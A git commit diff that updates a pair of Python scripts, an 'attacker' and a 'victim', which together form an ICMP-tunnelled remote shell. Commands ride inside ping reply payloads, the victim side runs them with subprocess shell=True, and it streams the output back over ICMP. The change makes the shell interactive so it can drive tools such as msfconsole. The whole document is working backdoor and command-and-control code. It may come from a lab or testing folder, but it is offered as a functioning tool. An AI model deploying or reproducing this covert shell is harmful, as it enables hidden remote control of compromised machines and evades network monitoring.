022add47ce3bcc58e02f6652d0dc1d79f509e040
FATBO1 <maxneo14@gmail.com>
2024-06-17 23:11:10 +0800

    improved interactive
    now can ping and msfconsole

--- testing/attacker_max.py
+++ testing/attacker_max.py
@@ -1,14 +1,22 @@
 from scapy.all import *
+import threading
 
 
 # ICMP id 10 = 0xa
 def send_packet(ipsrc):
-    command = str(input("Shell: "))
-    if command == "exit":
-        exit()
-    else:
-        ip_packet = IP(dst=ipsrc) / ICMP(id=10, type=0) / Raw(load=command)
-        send(ip_packet, verbose=0)
+    while True:
+        try:
+            command = str(input("Shell> "))
+            if command == "exit":
+                exit()
+            else:
+                ip_packet = IP(dst=ipsrc) / ICMP(id=10, type=0) / Raw(load=command)
+                send(ip_packet, verbose=0)
+                break
+        except KeyboardInterrupt:
+            print("\nType 'exit' or 'quit' to leave the shell.")
+        except Exception as e:
+            print(f"An error occurred: {e}")
 
 
 def check_packet_valid(packet):
@@ -16,8 +24,13 @@ def check_packet_valid(packet):
         ip_src = packet[IP].src
         if packet.haslayer(Raw):
             output = packet[Raw].load.decode()
-            print(output)
-            send_packet(ip_src)
+            if output == "s":
+                print("")
+            elif "not found" in output:
+                print(output)
+                send_packet(ip_src)
+            else:
+                print(output)
         else:
             send_packet(ip_src)
 
--- testing/victim_max.py
+++ testing/victim_max.py
@@ -17,23 +17,46 @@ def check_packet(packet):
         if packet.haslayer(ICMP) and packet[ICMP].type == 0:
             if packet[ICMP].id == 10 and packet[Raw].load:
                 if packet[Ether].src != get_if_hwaddr("eth0"):
-                    result = subprocess.run(
-                        packet[Raw].load, shell=True, capture_output=True, text=True
+                    result = subprocess.Popen(
+                        packet[Raw].load,
+                        shell=True,
+                        stdout=subprocess.PIPE,
+                        stderr=subprocess.PIPE,
+                        text=True,
                     )
-                    if result.stdout:
+
+                    # Continuously read output and error
+                    while True:
+                        output = result.stdout.readline()
+                        if output == "" and result.poll() is not None:
+                            break
+                        if output:
+                            if output.strip() == "":
+                                reply_packet = (
+                                    IP(dst=packet[IP].src)
+                                    / ICMP(id=10, type=0)
+                                    / Raw(load="s")
+                                )
+                                send(reply_packet)
+                            else:
+                                reply_packet = (
+                                    IP(dst=packet[IP].src)
+                                    / ICMP(id=10, type=0)
+                                    / Raw(load=output.strip())
+                                )
+                                send(reply_packet)
+                                print(output.strip())
+
+                    err = result.stderr.read()
+                    if err:
                         reply_packet = (
                             IP(dst=packet[IP].src)
                             / ICMP(id=10, type=0)
-                            / Raw(load=result.stdout)
+                            / Raw(load=err.strip())
                         )
                         send(reply_packet)
-                    elif result.stderr:
-                        reply_packet = (
-                            IP(dst=packet[IP].src)
-                            / ICMP(id=10, type=0)
-                            / Raw(load=result.stderr)
-                        )
-                        send(reply_packet)
+                        # print(err.strip())
+
                     else:
                         reply_packet = (
                             IP(dst=packet[IP].src) / ICMP(id=10, type=0) / Raw()
